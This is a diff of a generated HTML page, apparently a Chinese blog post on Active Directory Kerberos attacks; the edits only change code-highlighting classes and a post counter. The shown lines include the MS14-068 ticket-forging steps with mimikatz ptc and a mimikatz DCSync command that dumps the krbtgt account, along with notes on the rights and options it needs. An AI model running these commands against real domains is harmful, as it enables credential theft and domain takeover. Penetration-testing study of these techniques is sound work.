@@ -572,7 +572,7 @@
 <ul>
 <li>利用方法:</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14<span class="number">-068.</span>exe -u -p -s -d  <span class="comment"># 生成vuln.ccache</span></span><br><span class="line">klist /purge  <span class="comment"># 清除内存中的Ticket</span></span><br><span class="line">kerberos::ptc vuln.ccache  <span class="comment"># 导入vuln.ccache</span></span><br><span class="line">klist <span class="comment"># 查看是否导入</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14<span class="number">-068.</span>exe -u -p -s -d  <span class="meta"># 生成vuln.ccache</span></span><br><span class="line">klist /purge  <span class="meta"># 清除内存中的Ticket</span></span><br><span class="line"><span class="symbol">kerberos:</span>:ptc vuln.ccache  <span class="meta"># 导入vuln.ccache</span></span><br><span class="line">klist <span class="meta"># 查看是否导入</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p>Kekeo</p>
 <ul>
@@ -656,7 +656,7 @@
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">"lsadump::dcsync /dc:dc-01.vuln.local /domain:vuln.local /user:krbtgt"</span></span><br></pre></td></tr></table></figure>
 <p>所以可以获取任何Kerberos服务权限。</p>
 <p>注：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br><span class="line">向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。</span><br><span class="line">需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户</span><br><span class="line">只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br><span class="line">向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。</span><br><span class="line">需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户</span><br><span class="line">只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure>
 <p>参数选项：</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">/user </span>- 要查询的用户id 或 SID</span><br><span class="line">/domain（可选的）默认设置为当前域。</span><br><span class="line">/dc（可选的）指定DCSync 连接的域控位置</span><br></pre></td></tr></table></figure>
 <p>当然还有其他可作<code>Silver Ticket</code>的服务</p>
@@ -839,7 +839,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
